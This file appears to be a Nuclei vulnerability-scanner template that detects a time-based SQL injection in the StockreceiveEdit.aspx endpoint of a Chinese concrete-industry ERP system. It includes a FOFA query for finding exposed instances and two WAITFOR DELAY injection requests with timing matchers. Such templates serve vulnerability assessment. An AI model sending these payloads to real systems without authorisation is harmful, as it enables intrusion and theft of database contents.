id: shanghunERP-StockreceiveEdit_aspx-sql

info:
  name: "商混ERP系统 StockreceiveEdit.aspx 基于时间延迟的SQL注入"
  author: Unknown
  severity: high
  description: |-
    fofa: app="商混ERP系统"
      商混ERP系统中 StockreceiveEdit.aspx 接口存在基于时间延迟的SQL注入漏洞。攻击者可通过构造恶意输入实现数据库内容枚举（如管理员凭证、用户敏感数据），在具备高权限条件下可能进一步执行任意代码，导致服务器控制权丧失。
  reference:
  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487565&idx=1&sn=8d8079c0446470bcb1f32d89872f6110&chksm=c267a57ef5102c6883feac8b1f870a56b0a06997881367ecd3dc0eb18871aee558fd58b268c2&token=1439003696&lang=zh_CN#rd
  tags: 商混ERP系统


http:
- raw:
  - |
    GET /ERP/StockreceiveEdit.aspx?id=1;WAITFOR%20DELAY%20%270:0:4%27-- HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36


  - |
    GET /ERP/StockreceiveEdit.aspx?id=1;WAITFOR%20DELAY%20%270:0:8%27-- HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36

  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=4 && duration_1<=5'
    - 'duration_2>=8 && duration_2<=9'
    condition: and



